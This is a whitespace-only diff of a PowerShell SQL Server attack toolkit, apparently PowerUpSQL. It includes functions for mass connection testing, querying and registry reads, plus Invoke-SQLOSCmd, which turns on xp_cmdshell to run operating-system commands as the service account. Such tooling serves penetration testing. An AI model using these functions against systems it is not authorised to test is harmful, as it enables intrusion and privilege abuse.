@@ -22,37 +22,37 @@
 # ----------------------------------
 # Author: Scott Sutherland
 # Reference: https://msdn.microsoft.com/en-us/library/ms188247.aspx
-Function  Get-SQLConnectionObject 
+Function  Get-SQLConnectionObject
 {
     <#
             .SYNOPSIS
             Creates a object for connecting to SQL Server.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
             SQL Server credential.
             .PARAMETER Database
-            Default database to connect to.          
+            Default database to connect to.
             .EXAMPLE
             PS C:\> Get-SQLConnectionObject -Username MySQLUser -Password MySQLPassword
 
             StatisticsEnabled                : False
-            AccessToken                      : 
+            AccessToken                      :
             ConnectionString                 : Server=SQLServer1;Database=Master;User ID=MySQLUser;Password=MySQLPassword;Connection Timeout=1
             ConnectionTimeout                : 1
             Database                         : Master
             DataSource                       : SQLServer1
             PacketSize                       : 8000
             ClientConnectionId               : 00000000-0000-0000-0000-000000000000
-            ServerVersion                    : 
+            ServerVersion                    :
             State                            : Closed
             WorkstationId                    : SQLServer1
-            Credential                       : 
+            Credential                       :
             FireInfoMessageEventOnUserErrors : False
-            Site                             : 
-            Container                        : 
+            Site                             :
+            Container                        :
     #>
     [CmdletBinding()]
     Param(
@@ -68,9 +68,9 @@ Function  Get-SQLConnectionObject
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -88,7 +88,7 @@ Function  Get-SQLConnectionObject
     )
 
     Begin
-    {           
+    {
         # Setup DAC string
         if($DAC)
         {
@@ -116,7 +116,7 @@ Function  Get-SQLConnectionObject
 
         # Create connection object
         $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection
-    
+
         # Check for username and password
         if($Username -and $Password)
         {
@@ -134,27 +134,27 @@ Function  Get-SQLConnectionObject
             Write-Debug -Message "Attempting to authenticate to $DacConn$Instance as current Windows user ($ConnectionectUser)..."
 
             # Setup connection string with trusted connection
-            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1" 
-            
+            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1"
+
             <#
-            # Check for provided credential
-            if ($Credential){
-                
-                $Username = $credential.Username 
-                $Password = $Credential.GetNetworkCredential().Password 
+                    # Check for provided credential
+                    if ($Credential){
 
-                # Setup connection string with SQL Server credentials
-                $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"                
-            } 
-            #>                                
-        }       
+                    $Username = $credential.Username
+                    $Password = $Credential.GetNetworkCredential().Password
 
-        # Return the connection object             
-        return $Connection                     
+                    # Setup connection string with SQL Server credentials
+                    $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut"
+                    }
+            #>
+        }
+
+        # Return the connection object
+        return $Connection
     }
 
     End
-    {                
+    {
     }
 }
 
@@ -163,25 +163,25 @@ Function  Get-SQLConnectionObject
 #  Get-SQLConnectionTest
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLConnectionTest 
+Function  Get-SQLConnectionTest
 {
     <#
             .SYNOPSIS
             Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER Database
-            Default database to connect to. 
+            Default database to connect to.
             .PARAMETER TimeOut
-            Connection time out. 
+            Connection time out.
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .EXAMPLE
@@ -189,7 +189,7 @@ Function  Get-SQLConnectionTest
             .EXAMPLE
             PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose         
+            PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose
     #>
     [CmdletBinding()]
     Param(
@@ -205,12 +205,12 @@ Function  Get-SQLConnectionTest
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Connect using Dedicated Admin Connection.')]
@@ -239,7 +239,7 @@ Function  Get-SQLConnectionTest
     }
 
     Process
-    {      
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -265,7 +265,7 @@ Function  Get-SQLConnectionTest
         try
         {
             # Open connection
-            $Connection.Open()                                              
+            $Connection.Open()
 
             if(-not $SuppressVerbose)
             {
@@ -279,11 +279,11 @@ Function  Get-SQLConnectionTest
             $Connection.Close()
 
             # Dispose connection
-            $Connection.Dispose() 
+            $Connection.Dispose()
         }
         catch
         {
-            # Connection failed                        
+            # Connection failed
             if(-not $SuppressVerbose)
             {
                 $ErrorMessage = $_.Exception.Message
@@ -293,13 +293,13 @@ Function  Get-SQLConnectionTest
 
             # Add record
             $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
-        }          
+        }
     }
 
     End
-    {   
+    {
         # Return Results
-        $TblResults          
+        $TblResults
     }
 }
 
@@ -308,25 +308,25 @@ Function  Get-SQLConnectionTest
 #  Get-SQLConnectionTestThreaded
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLConnectionTestThreaded 
+Function  Get-SQLConnectionTestThreaded
 {
     <#
             .SYNOPSIS
             Tests if the current Windows account or provided SQL Server login can log into an SQL Server.  This version support threading using runspaces.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER Database
-            Default database to connect to. 
+            Default database to connect to.
             .PARAMETER TimeOut
-            Connection time out. 
+            Connection time out.
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .PARAMETER Threads
@@ -352,12 +352,12 @@ Function  Get-SQLConnectionTestThreaded
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Connect using Dedicated Admin Connection.')]
@@ -392,16 +392,17 @@ Function  Get-SQLConnectionTestThreaded
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -409,19 +410,18 @@ Function  Get-SQLConnectionTestThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
-
             # Setup instance
             $Instance = $_.Instance
-            
+
             # Parse computer name from the instance
             $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -441,7 +441,7 @@ Function  Get-SQLConnectionTestThreaded
             try
             {
                 # Open connection
-                $Connection.Open()                                              
+                $Connection.Open()
 
                 if(-not $SuppressVerbose)
                 {
@@ -455,12 +455,12 @@ Function  Get-SQLConnectionTestThreaded
                 $Connection.Close()
 
                 # Dispose connection
-                $Connection.Dispose() 
+                $Connection.Dispose()
             }
             catch
             {
-                # Connection failed       
-                                 
+                # Connection failed
+
                 if(-not $SuppressVerbose)
                 {
                     $ErrorMessage = $_.Exception.Message
@@ -470,11 +470,11 @@ Function  Get-SQLConnectionTestThreaded
 
                 # Add record
                 $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
-            }                      		
-        }         
+            }
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblResults
     }
@@ -485,25 +485,25 @@ Function  Get-SQLConnectionTestThreaded
 #  Get-SQLQuery
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLQuery 
+Function  Get-SQLQuery
 {
     <#
             .SYNOPSIS
             Executes a query on target SQL servers.This
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER Database
-            Default database to connect to. 
+            Default database to connect to.
             .PARAMETER TimeOut
-            Connection time out. 
+            Connection time out.
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .PARAMETER Threads
@@ -520,12 +520,12 @@ Function  Get-SQLQuery
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -533,14 +533,14 @@ Function  Get-SQLQuery
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
-        
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server query.')]
         [string]$Query,
 
@@ -572,7 +572,7 @@ Function  Get-SQLQuery
     }
 
     Process
-    {      
+    {
         # Setup DAC string
         if($DAC)
         {
@@ -607,16 +607,16 @@ Function  Get-SQLQuery
                 $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)
 
                 # Grab results
-                $Results = $Command.ExecuteReader()                                             
+                $Results = $Command.ExecuteReader()
 
-                # Load results into data table     
-                $TblQueryResults.Load($Results)                                                                                      
+                # Load results into data table
+                $TblQueryResults.Load($Results)
 
                 # Close connection
                 $Connection.Close()
 
                 # Dispose connection
-                $Connection.Dispose() 
+                $Connection.Dispose()
             }
             catch
             {
@@ -627,9 +627,9 @@ Function  Get-SQLQuery
                 }
 
                 if($ReturnError)
-                {                                                 
-                    $ErrorMessage = $_.Exception.Message          
-                    #Write-Verbose  " Error: $ErrorMessage"                
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    #Write-Verbose  " Error: $ErrorMessage"
                 }
             }
         }
@@ -641,7 +641,7 @@ Function  Get-SQLQuery
     }
 
     End
-    {   
+    {
         # Return Results
         if($ReturnError)
         {
@@ -650,34 +650,34 @@ Function  Get-SQLQuery
         else
         {
             $TblQueryResults
-        }                  
+        }
     }
 }
 
 
 # ----------------------------------
-#  Get-SQLQueryThreaded 
+#  Get-SQLQueryThreaded
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLQueryThreaded 
+Function  Get-SQLQueryThreaded
 {
     <#
             .SYNOPSIS
             Executes a query on target SQL servers.This version support threading using runspaces.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER Database
-            Default database to connect to. 
+            Default database to connect to.
             .PARAMETER TimeOut
-            Connection time out. 
+            Connection time out.
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .PARAMETER Threads
@@ -705,12 +705,12 @@ Function  Get-SQLQueryThreaded
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Connect using Dedicated Admin Connection.')]
@@ -746,16 +746,17 @@ Function  Get-SQLQueryThreaded
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -763,17 +764,17 @@ Function  Get-SQLQueryThreaded
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
             $Instance = $_.Instance
-            
+
             # Parse computer name from the instance
             $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -793,7 +794,7 @@ Function  Get-SQLQueryThreaded
             try
             {
                 # Open connection
-                $Connection.Open()                                              
+                $Connection.Open()
 
                 if(-not $SuppressVerbose)
                 {
@@ -804,21 +805,21 @@ Function  Get-SQLQueryThreaded
                 $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)
 
                 # Grab results
-                $Results = $Command.ExecuteReader()                                         
+                $Results = $Command.ExecuteReader()
 
-                # Load results into data table     
-                $TblResults.Load($Results)  
+                # Load results into data table
+                $TblResults.Load($Results)
 
                 # Close connection
                 $Connection.Close()
 
                 # Dispose connection
-                $Connection.Dispose() 
+                $Connection.Dispose()
             }
             catch
             {
-                # Connection failed       
-                                 
+                # Connection failed
+
                 if(-not $SuppressVerbose)
                 {
                     $ErrorMessage = $_.Exception.Message
@@ -828,11 +829,11 @@ Function  Get-SQLQueryThreaded
 
                 # Add record
                 $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
-            }                      		
-        }         
+            }
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblResults
     }
@@ -850,23 +851,23 @@ Function  Get-SQLQueryThreaded
 #  Invoke-SQLOSCmd
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Invoke-SQLOSCmd 
+Function  Invoke-SQLOSCmd
 {
     <#
             .SYNOPSIS
             Execute command on the operating system as the SQL Server service account using xp_cmdshell. Supports threading, raw output, and table output.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER DAC
-            Connect using Dedicated Admin Connection. 
+            Connect using Dedicated Admin Connection.
             .PARAMETER TimeOut
-            Connection time out. 
+            Connection time out.
             .PARAMETER SuppressVerbose
             Suppress verbose errors.  Used when function is wrapped.
             .PARAMETER Threads
@@ -894,9 +895,9 @@ Function  Invoke-SQLOSCmd
             VERBOSE: Closing the runspace pool
             output
             ------
-      
+
             Directory of c:\windows\system32\drivers\etc
-      
+
             06/22/2016  09:09 AM    <DIR>          .
             06/22/2016  09:09 AM    <DIR>          ..
             09/22/2015  10:16 AM               851 hosts
@@ -907,8 +908,8 @@ Function  Invoke-SQLOSCmd
             5 File(s)         23,762 bytes
             2 Dir(s)  56,438,497,280 bytes free
             .EXAMPLE
-            PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLSERVER1.domain.com,1433" -Command "whoami" 
-            Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "whoami" 
+            PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLSERVER1.domain.com,1433" -Command "whoami"
+            Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "whoami"
             VERBOSE: Creating runspace pool and session states
             VERBOSE: SQLServer1 : Connection Success.
             VERBOSE: SQLServer1 : Connection Success.
@@ -922,12 +923,12 @@ Function  Invoke-SQLOSCmd
             VERBOSE: SQLServer1 : Disabling Show Advanced Options
             VERBOSE: Closing the runspace pool
 
-            ComputerName   Instance       CommandResults         
-            ------------   --------       --------------         
-            SQLServer1     SQLServer1     nt service\mssqlserver 
+            ComputerName   Instance       CommandResults
+            ------------   --------       --------------
+            SQLServer1     SQLServer1     nt service\mssqlserver
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain | Invoke-SQLOSCmd -Verbose -Command "whoami" -Threads 5
-            Get-SQLInstanceLocal | Invoke-SQLOSCmd -Verbose -Command "whoami" 
+            Get-SQLInstanceLocal | Invoke-SQLOSCmd -Verbose -Command "whoami"
             VERBOSE: Creating runspace pool and session states
             VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
             VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
@@ -953,11 +954,11 @@ Function  Invoke-SQLOSCmd
             VERBOSE: SQLServer1 : Disabling Show Advanced Options
             VERBOSE: Closing the runspace pool
 
-            ComputerName   Instance                       CommandResults              
-            ------------   --------                       --------------              
-            SQLServer1     SQLServer1\SQLEXPRESS          nt service\mssql$sqlexpress 
-            SQLServer1     SQLServer1\STANDARDDEV2014     nt authority\system         
-            SQLServer1     SQLServer1                     nt service\mssqlserver      
+            ComputerName   Instance                       CommandResults
+            ------------   --------                       --------------
+            SQLServer1     SQLServer1\SQLEXPRESS          nt service\mssql$sqlexpress
+            SQLServer1     SQLServer1\STANDARDDEV2014     nt authority\system
+            SQLServer1     SQLServer1                     nt service\mssqlserver
 
     #>
     [CmdletBinding()]
@@ -974,12 +975,12 @@ Function  Invoke-SQLOSCmd
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
                 ValueFromPipeline,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
-        [string]$Instance,       
+        [string]$Instance,
 
         [Parameter(Mandatory = $false,
         HelpMessage = 'Connect using Dedicated Admin Connection.')]
@@ -1000,7 +1001,7 @@ Function  Invoke-SQLOSCmd
         [Parameter(Mandatory = $false,
         HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
         [switch]$SuppressVerbose,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Just show the raw results without the computer or instance name.')]
         [switch]$RawResults
@@ -1014,22 +1015,23 @@ Function  Invoke-SQLOSCmd
         $null = $TblResults.Columns.Add('ComputerName')
         $null = $TblResults.Columns.Add('Instance')
         $null = $TblResults.Columns.Add('CommandResults')
-        
+
 
         # Setup data table for pipeline threading
         $PipelineItems = New-Object -TypeName System.Data.DataTable
 
         # set instance to local host by default
-        if(-not $Instance){ 
+        if(-not $Instance)
+        {
             $Instance = $env:COMPUTERNAME
         }
 
         # Ensure provided instance is processed
         if($Instance)
-        {            
+        {
             $ProvideInstance = New-Object -TypeName PSObject -Property @{
                 Instance = $Instance
-            }            
+            }
         }
 
         # Add instance to instance list
@@ -1037,17 +1039,17 @@ Function  Invoke-SQLOSCmd
     }
 
     Process
-    {      
+    {
         # Create list of pipeline items
-        $PipelineItems = $PipelineItems + $_         
+        $PipelineItems = $PipelineItems + $_
     }
 
     End
-    {   
+    {
         # Define code to be multi-threaded
         $MyScriptBlock = {
             $Instance = $_.Instance
-            
+
             # Parse computer name from the instance
             $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -1073,31 +1075,31 @@ Function  Invoke-SQLOSCmd
             try
             {
                 # Open connection
-                $Connection.Open()                                              
+                $Connection.Open()
 
                 if(-not $SuppressVerbose)
                 {
                     Write-Verbose -Message "$Instance : Connection Success."
                 }
-               
+
                 # Switch to track xp_cmdshell status
                 $DisableShowAdvancedOptions = 0
                 $DisableXpCmdshell = 0
 
                 # Get sysadmin status
-                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin               
-      
+                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
+
                 # Check if xp_cmdshell is enabled
                 if($IsSysadmin -eq 'Yes')
                 {
-                    Write-Verbose -Message "$Instance : You are a sysadmin." 
+                    Write-Verbose -Message "$Instance : You are a sysadmin."
                     $IsXpCmdshellEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                     $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                 }
                 else
                 {
-                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges." 
-                     
+                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."
+
                     # Add record
                     $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
                     return
@@ -1155,8 +1157,8 @@ Function  Invoke-SQLOSCmd
                     }
                     else
                     {
-                        Write-Verbose -Message "$Instance : Enabling xp_cmdshell failed. Aborting."                
-                        
+                        Write-Verbose -Message "$Instance : Enabling xp_cmdshell failed. Aborting."
+
                         # Add record
                         $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable xp_cmdshell.')
 
@@ -1181,15 +1183,15 @@ Function  Invoke-SQLOSCmd
                 {
                     $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults)
                 }
-                
-                # Restore xp_cmdshell state if needed                
+
+                # Restore xp_cmdshell state if needed
                 if($DisableXpCmdshell -eq 1)
                 {
                     Write-Verbose -Message "$Instance : Disabling xp_cmdshell"
                     Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                 }
 
-                # Restore Show Advanced Options state if needed                
+                # Restore Show Advanced Options state if needed
                 if($DisableShowAdvancedOptions -eq 1)
                 {
                     Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
@@ -1204,8 +1206,8 @@ Function  Invoke-SQLOSCmd
             }
             catch
             {
-                # Connection failed       
-                                 
+                # Connection failed
+
                 if(-not $SuppressVerbose)
                 {
                     $ErrorMessage = $_.Exception.Message
@@ -1215,11 +1217,11 @@ Function  Invoke-SQLOSCmd
 
                 # Add record
                 $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
-            }                      		
-        }         
+            }
+        }
 
         # Run scriptblock using multi-threading
-        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                
+        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
 
         return $TblResults
     }
@@ -1229,21 +1231,21 @@ Function  Invoke-SQLOSCmd
 #  Get-SQLServerInfo
 # ----------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServerInfo 
+Function  Get-SQLServerInfo
 {
     <#
             .SYNOPSIS
             Returns basic server and user information from target SQL Servers.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .EXAMPLE
-            PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014 
+            PS C:\> Get-SQLServerInfo -Instance SQLServer1\STANDARDDEV2014
 
             ComputerName           : SQLServer1
             Instance               : SQLServer1\STANDARDDEV2014
@@ -1280,9 +1282,9 @@ Function  Get-SQLServerInfo
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -1348,7 +1350,7 @@ Function  Get-SQLServerInfo
                 EXECUTE master.dbo.xp_regread
                 @rootkey		= N'HKEY_LOCAL_MACHINE',
                 @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
-                @value_name		= N'ProductType', 
+                @value_name		= N'ProductType',
                 @value			= @MachineType output
 
                 -- Get OS version
@@ -1356,7 +1358,7 @@ Function  Get-SQLServerInfo
                 EXECUTE master.dbo.xp_regread
                 @rootkey		= N'HKEY_LOCAL_MACHINE',
                 @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
-                @value_name		= N'ProductName', 
+                @value_name		= N'ProductName',
             @value			= @ProductName output"
 
             $SysadminQuery = '  @MachineType as [OsMachineType],
@@ -1369,33 +1371,33 @@ Function  Get-SQLServerInfo
         }
 
         # Define Query
-        $Query = "  -- Get SQL Server Information 
+        $Query = "  -- Get SQL Server Information
 
-            -- Get SQL Server Service Name and Path 
-            DECLARE @SQLServerInstance varchar(250) 
-            DECLARE @SQLServerServiceName varchar(250) 
+            -- Get SQL Server Service Name and Path
+            DECLARE @SQLServerInstance varchar(250)
+            DECLARE @SQLServerServiceName varchar(250)
             if @@SERVICENAME = 'MSSQLSERVER'
-            BEGIN											
+            BEGIN
             set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
             set @SQLServerServiceName = 'MSSQLSERVER'
-            END						
+            END
             ELSE
             BEGIN
-            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
-            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))							
+            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
+            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
             END
 
-            -- Get SQL Server Service Account 
